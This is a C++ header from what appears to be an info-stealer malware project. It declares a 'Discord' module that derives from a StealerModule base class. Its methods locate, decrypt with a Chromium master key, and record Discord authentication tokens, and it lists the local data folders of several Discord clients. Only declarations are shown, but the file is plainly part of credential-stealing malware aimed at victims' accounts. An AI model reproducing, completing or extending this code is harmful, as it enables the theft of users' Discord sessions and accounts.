//
// Created by .1qxz on 07.06.2024.
//

#ifndef STEALER_DISCORD_H
#define STEALER_DISCORD_H

#include <fstream>
#include <sstream>
#include <regex>
#include "json.hpp"

#include "../../../StealerModule.h"
#include "../../../../utils/chromuim/ChromiumUtil.h"

using json = nlohmann::json;

class Discord : public StealerModule {
public:
    void execute(fs::path &root) override;
private:
    static void writeTokenInfo(const std::string& token, const fs::path& root);

    std::vector<std::string> getTokens();
    std::vector<std::string> getToken(fs::path &root);
    static std::vector<std::string> scanToken(fs::path &root, const std::vector<BYTE>& master_key);

    std::vector<fs::path> discord_paths = {
        Utils::getRoamingPath() / "discord",
        Utils::getRoamingPath() / "discordcanary",
        Utils::getRoamingPath() / "Lightcord",
        Utils::getRoamingPath() / "discordptb"
    };
};


#endif //STEALER_DISCORD_H
